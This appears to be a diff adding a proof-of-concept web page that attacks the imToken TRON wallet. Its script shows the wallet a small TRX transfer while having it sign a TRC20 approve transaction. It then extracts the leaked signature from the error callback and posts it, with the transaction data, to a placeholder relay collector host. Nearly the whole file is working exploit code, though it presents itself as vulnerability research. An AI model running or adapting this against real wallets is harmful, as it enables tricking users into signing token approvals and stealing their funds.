@@ -1,0 +1,303 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>TRON SIGERROR callback signature leak PoC</title>
+    <style>
+      body {
+        color: #111827;
+        font: 14px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        margin: 18px;
+      }
+
+      label {
+        display: block;
+        font-size: 13px;
+        margin: 10px 0 4px;
+      }
+
+      input {
+        box-sizing: border-box;
+        padding: 8px;
+        width: min(780px, 100%);
+      }
+
+      button {
+        margin-top: 14px;
+        padding: 10px 14px;
+      }
+
+      pre {
+        background: #f3f4f6;
+        padding: 12px;
+        white-space: pre-wrap;
+        word-break: break-word;
+      }
+    </style>
+  </head>
+  <body>
+    <label>Relay / collector URL</label>
+    <input id="relayUrl" value="https://YOUR-RELAY.example" />
+
+    <label>Preview recipient shown in wallet TransferContract</label>
+    <input id="previewRecipient" value="T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb" />
+
+    <label>Preview amount in sun</label>
+    <input id="previewAmount" value="10000" />
+
+    <label>TRC20 token contract</label>
+    <input id="tokenContract" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" />
+
+    <label>Approve spender (blank = current wallet)</label>
+    <input id="spender" placeholder="defaults to current address" />
+
+    <label>Approve amount</label>
+    <input id="approveAmount" value="1" />
+
+    <button id="runBtn">Run SIGERROR Callback Leak PoC</button>
+
+    <pre id="status">Ready.</pre>
+    <pre id="callbackResult"></pre>
+    <pre id="approveTx"></pre>
+
+    <script>
+      const $ = (id) => document.getElementById(id);
+      const statusEl = $('status');
+      const callbackEl = $('callbackResult');
+      const approveEl = $('approveTx');
+      const runBtn = $('runBtn');
+
+      function setStatus(value) {
+        statusEl.textContent = value;
+      }
+
+      function safeStringify(value) {
+        return JSON.stringify(value, null, 2);
+      }
+
+      function relayUrl() {
+        return $('relayUrl').value.trim().replace(/\/$/, '');
+      }
+
+      function requireHttpsRelay() {
+        const url = relayUrl();
+        if (!/^https:\/\//i.test(url)) {
+          throw new Error(`Relay URL must be HTTPS in imToken WebView. Current value: ${url || '(empty)'}`);
+        }
+        return url;
+      }
+
+      function getCurrentAccount() {
+        const account = window.tronWeb?.defaultAddress?.base58;
+        if (!account) {
+          throw new Error('No TRON account detected. Open this page inside imToken with a TRON wallet selected.');
+        }
+        return account;
+      }
+
+      async function postJson(url, body) {
+        let response;
+        try {
+          response = await fetch(url, {
+            method: 'POST',
+            headers: { 'content-type': 'application/json' },
+            body: JSON.stringify(body),
+          });
+        } catch (error) {
+          throw new Error(`Network load failed for ${url}: ${error?.message || String(error)}`);
+        }
+
+        const text = await response.text();
+        let json;
+        try {
+          json = JSON.parse(text);
+        } catch (error) {
+          throw new Error(`Non-JSON response from ${url}: ${text.slice(0, 300)}`);
+        }
+
+        if (!response.ok) {
+          throw new Error(`HTTP ${response.status} from ${url}: ${safeStringify(json)}`);
+        }
+        return json;
+      }
+
+      async function getJson(url) {
+        const response = await fetch(url);
+        const text = await response.text();
+        try {
+          return JSON.parse(text);
+        } catch (error) {
+          throw new Error(`Non-JSON response from ${url}: ${text.slice(0, 300)}`);
+        }
+      }
+
+      function encodeApproveParams(spender, amount) {
+        const spenderHex = window.tronWeb.address
+          .toHex(spender)
+          .replace(/^41/, '')
+          .padStart(64, '0');
+        const amountHex = BigInt(amount).toString(16).padStart(64, '0');
+        return spenderHex + amountHex;
+      }
+
+      async function buildPreviewTransfer(from) {
+        const result = await postJson(`${relayUrl()}/wallet/createtransaction`, {
+          owner_address: from,
+          to_address: $('previewRecipient').value.trim(),
+          amount: Number($('previewAmount').value.trim()),
+          visible: true,
+        });
+        if (result.Error) throw new Error(`createtransaction failed: ${result.Error}`);
+        return result;
+      }
+
+      async function buildApprove(from, spender) {
+        const result = await postJson(`${relayUrl()}/wallet/triggersmartcontract`, {
+          owner_address: from,
+          contract_address: $('tokenContract').value.trim(),
+          function_selector: 'approve(address,uint256)',
+          parameter: encodeApproveParams(spender, $('approveAmount').value.trim()),
+          fee_limit: 100000000,
+          call_value: 0,
+          visible: true,
+        });
+        if (!result?.result?.result || !result?.transaction?.raw_data_hex) {
+          throw new Error(`triggersmartcontract failed: ${safeStringify(result)}`);
+        }
+        return result;
+      }
+
+      function buildMismatchedTx(previewTransfer, approveTx) {
+        return {
+          ...approveTx.transaction,
+          raw_data: previewTransfer.raw_data,
+          raw_data_hex: approveTx.transaction.raw_data_hex,
+          txID: approveTx.transaction.txID,
+        };
+      }
+
+      function describeContract(rawData) {
+        const contract = rawData?.contract?.[0] || {};
+        const value = contract.parameter?.value || {};
+        return {
+          type: contract.type,
+          owner_address: value.owner_address,
+          to_address: value.to_address,
+          contract_address: value.contract_address,
+          amount: value.amount,
+          data_selector: value.data ? value.data.slice(0, 8) : undefined,
+        };
+      }
+
+      function extractSignatureFromCallback(value) {
+        const text = typeof value === 'string' ? value : safeStringify(value);
+        const sigErrorMatch = text.match(/Validate signature error:\s*([0-9a-f]{130})/i);
+        if (sigErrorMatch) return sigErrorMatch[1];
+
+        const genericMatch = text.match(/\b([0-9a-f]{130})\b/i);
+        return genericMatch ? genericMatch[1] : null;
+      }
+
+      function callSendTransactionRawCallback(account, tx) {
+        const params = { from: account, tx, useTronHeader: true };
+
+        if (!window.imToken?.callAPI) {
+          throw new Error('window.imToken.callAPI is unavailable. Please use imToken dapp browser.');
+        }
+
+        return new Promise((resolve) => {
+          window.imToken.callAPI('tron.sendTransaction', params, (err, result) => {
+            resolve({ err, result, callbackValue: result || err });
+          });
+        });
+      }
+
+      async function run() {
+        runBtn.disabled = true;
+        try {
+          const relay = requireHttpsRelay();
+          setStatus('Checking relay collector health...');
+          await getJson(`${relay}/__poc/health`);
+
+          const account = getCurrentAccount();
+          const spender = $('spender').value.trim() || account;
+
+          setStatus('Building TransferContract preview and approve raw_data_hex...');
+          const previewTransfer = await buildPreviewTransfer(account);
+          const approveTx = await buildApprove(account, spender);
+          const approveData = approveTx.transaction.raw_data.contract[0].parameter.value.data;
+          if (approveData.slice(0, 8).toLowerCase() !== '095ea7b3') {
+            throw new Error(`Unexpected approve selector: ${approveData.slice(0, 8)}`);
+          }
+
+          const tx = buildMismatchedTx(previewTransfer, approveTx);
+          approveEl.textContent = safeStringify({
+            approveTxID: approveTx.transaction.txID,
+            approveSelector: approveData.slice(0, 8),
+            walletPreviewSource: describeContract(tx.raw_data),
+            signedRawHexCandidate: describeContract(approveTx.transaction.raw_data),
+          });
+
+          setStatus(
+            [
+              'Calling imToken.callAPI("tron.sendTransaction") with mismatched tx.',
+              '',
+              'Confirm only if the wallet prompt displays the transfer.',
+              'Expected validation path: wallet signs approve raw_data_hex, normal node validates against transfer raw_data, then returns SIGERROR.',
+              '',
+              'This PoC checks whether the callback error message contains the signature.',
+            ].join('\n')
+          );
+
+          const callback = await callSendTransactionRawCallback(account, tx);
+          const signatureFromCallback = extractSignatureFromCallback(callback.callbackValue);
+
+          const collectorResult = await postJson(`${relay}/__poc/callbackLeak`, {
+            callbackValue: callback.callbackValue,
+            approveCandidate: {
+              txID: approveTx.transaction.txID,
+              selector: approveData.slice(0, 8),
+              raw_data: approveTx.transaction.raw_data,
+              raw_data_hex: approveTx.transaction.raw_data_hex,
+            },
+            mismatchedTxSummary: {
+              raw_data: describeContract(tx.raw_data),
+              raw_data_hex: describeContract(approveTx.transaction.raw_data),
+            },
+          });
+
+          callbackEl.textContent = safeStringify({
+            callback,
+            signatureFromCallback,
+            collectorResult,
+          });
+
+          setStatus(
+            signatureFromCallback
+              ? [
+                  'CONFIRMED: signature was present in tron.sendTransaction callback error.',
+                  '',
+                  `signature: ${signatureFromCallback}`,
+                  '',
+                  'Server side: GET /__poc/callbackLeaks also contains the captured callback object.',
+                ].join('\n')
+              : [
+                  'No signature found in callback value.',
+                  '',
+                  'If callback message is account mismatch / user canceled / expired transaction, this run did not reach the SIGERROR node-validation path.',
+                  'Check the callbackResult panel and retry with the selected TRON account matching the transaction owner.',
+                ].join('\n')
+          );
+        } catch (error) {
+          console.error(error);
+          setStatus(`Error: ${error?.message || String(error)}`);
+        } finally {
+          runBtn.disabled = false;
+        }
+      }
+
+      runBtn.addEventListener('click', run);
+    </script>
+  </body>
+</html>
